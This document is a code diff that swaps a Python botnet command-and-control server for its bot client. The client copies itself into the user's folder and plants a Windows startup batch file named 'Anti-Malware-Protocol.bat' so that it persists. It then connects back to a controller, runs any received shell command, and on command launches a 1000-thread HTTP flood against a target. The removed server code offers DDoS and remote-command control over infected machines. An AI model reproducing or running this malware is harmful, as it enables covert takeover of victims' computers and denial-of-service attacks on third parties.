@@ -1,103 +1,92 @@
-import socket, threading, os, time, sys
-ip = '0.0.0.0'
+import socket, random, time, threading, os, sys
+from shutil import copyfile
+backslash = ' \ '
+backslash = backslash.strip()
+def get_filename():
+    cwd = sys.argv[0]
+    cwd = list(cwd)
+    result = ""
+    for i in cwd:
+        if i == "/" or i == backslash:
+            result = result + " "
+        else:
+            result = result + i
+    result = result.split()
+    final_result = result[(len(result) -  1)]
+    return final_result
+user = os.getlogin()
+try:
+    copyfile(f'{get_filename()}',f'C:/Users/{user}/{get_filename()}')
+    os.chdir(f'C:/Users/{user}/{get_filename()}')
+except:
+    pass
+os.chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+file = open('Anti-Malware-Protocol.bat', 'w')
+linestowrite = [f'cd C:/Users/{user}/\n', f'start {get_filename()}\n']
+file.writelines(linestowrite)
+file.close()
+
 port = 80
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((ip, port))
-hostname = socket.gethostname()
-connections = []
-start_recv = False
-bot_count = 0
-print(" ____        _              _      _____                            ___    ___  ")
-print("|  _ \      | |            | |    / ____|                          |__ \  / _ \ ")
-print("| |_) | ___ | |_ _ __   ___| |_  | (___   ___ _ ____   _____ _ __     ) || | | |")
-print("|  _ < / _ \| __| '_ \ / _ \ __|  \___ \ / _ \ '__\ \ / / _ \ '__|   / / | | | |")
-print("| |_) | (_) | |_| | | |  __/ |_   ____) |  __/ |   \ V /  __/ |     / /_ | |_| |")
-print("|____/ \___/ \__|_| |_|\___|\__| |_____/ \___|_|    \_/ \___|_|    |____(_)___/ ")
-print("Script by DrSquid")
-print("")
-print("This is a server for making infected computers with the client-side script connect\nto this server and allowing you to run ssh commands or starting a DDoS Attack on\nwebsites via these bots. Make sure that you have port forwarded so that you can \nuse this script externally.")
-print("")
-print(f"[+] Server Hosted On Device: {hostname}")
-print(f"[+] Server Hosted On IP: {ip}, {socket.gethostbyname(socket.gethostname())}")
-print(f"[+] Server Hosted On Port: {port}")
-print("")
-def listen():
-    while True:
-        s.listen(1)
-        conn, ip = s.accept()
-        start_recv = True
-        connections.append(conn)
-        print(f"\n[+] {ip} has joined the server.")
-def instruct():
-    print("[+] Commands List:")
-    print("")
-    print("[+] !ddos <ip/domain> - Command initiates a DDoS attack from the bots to the provided ip/domain")
-    print("[+] !listcon - Lists all the bots")
-    print("[+] !botcount - Counts all of the bots connected")
-    print("[+] !shutdownAll - Shuts down all connected bot computers")
-    print("")
-    print("[+] Note: All other things said will run a terminal command on the bot computers.")
-    print("[+] Restarting the server is recommended if there are disconnections from the bots.")
-    print("")
-    print("[+] Server is now listening for connections......")
-    print("")
+ip = ''
+time.sleep(1)
+thread_num_mutex = threading.Lock()
+def printstatus():
+    global fake_ip
+    random_num1 = str(random.randint(0, 255))
+    random_num2 = str(random.randint(0, 255))
+    random_num3 = str(random.randint(0, 255))
+    random_num4 = str(random.randint(0, 255))
+    fake_ip = f'{random_num1}.{random_num2}.{random_num3}.{random_num4}'
+    thread_num_mutex.acquire(True)
+    thread_num_mutex.release()
+def ddos():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
-            instruction = input("[+] Enter your instruction: ")
-            instruction = instruction.encode()
-            if instruction.decode().lower() == "help":
-                os.system('help')
-            elif instruction.decode().lower().startswith('!ddos'):
-                if len(connections) == 0:
-                    print("")
-                    print("[+] Unable to perform DDoS Attack.\n[+] There are no bots connected!\n")
-                else:
-                    msg = instruction.decode()
-                    msg = msg.split()
-                    if len(msg) >= 1:
-                        ddosIP = msg[1]
-                        try:
-                            ddosIP = socket.gethostbyname(ddosIP)
-                            print("")
-                            print("[+] Starting DDoS Attack.")
-                            print("[+] Gathering Bots.....")
-                            print("")
-                            time.sleep(2)
-                            print("[+] DDoS Attack Started.")
-                            print("")
-                        except:
-                            print("[+] Invalid IP provided. Usage: !ddos <ip/domain>")
-                            print("")
-                    else:
-                        print("")
-            elif instruction.decode().lower().startswith('!listcon'):
-                print("")
-                print("[+] List of bots:")
-                print(connections)
-                print("")
-            elif instruction.decode().lower().startswith('!botcount'):
-                print("")
-                print(f"[+] Total Bot Count: {len(connections)}")
-                print("")
-            elif instruction.decode().lower().startswith('!shutdownall'):
-                print("[+] Shutting Down Bots....")
-                time.sleep(2)
-                instruction == "shutdown /s"
-                instruction = instruction.decode()
-            else:
-                print("")
-                print(f"[+] Sending '{instruction.decode()}' as a bash command to the bots.....")
-                print("")
-            for connection in connections:
-                try:
-                    conn = connection
-                    conn.send(instruction)
-                except:
-                    print(f"[+] Connection lost for conn: {conn}")
-                    conn.close()
+            printstatus()
+            sock.connect((ip, port))
+            sock.send(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'))
+            sock.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
         except:
             pass
-listeN = threading.Thread(target=listen)
-listeN.start()
-instrucT = threading.Thread(target=instruct)
-instrucT.start()
+threads = []
+conn_ip = socket.gethostbyname(socket.gethostname()) #<---- this is for testing purposes. Change the IP to the server ip for later use.
+port = 80
+commands = ['!ddos','!botcount','!listcon', '!shutdownAll']
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((conn_ip, port))
+        break
+    except:
+        s.close()
+        pass
+while True:
+    try:
+        message = s.recv(1024).decode()
+        if message.lower().startswith('!ddos'):
+            msg = message.split()
+            try:
+                ip = msg[1]
+                ip = socket.gethostbyname(ip)
+                for i in range(1000):
+                    x = threading.Thread(target=ddos)
+                    x.start()
+                    threads.append(x)
+                for currentthread in threads:
+                    currentthread.join()
+            except:
+                pass
+        elif message in commands:
+            pass
+        else:
+            os.system(message)
+    except:
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((conn_ip, port))
+                break
+            except:
+                s.close()
+                pass
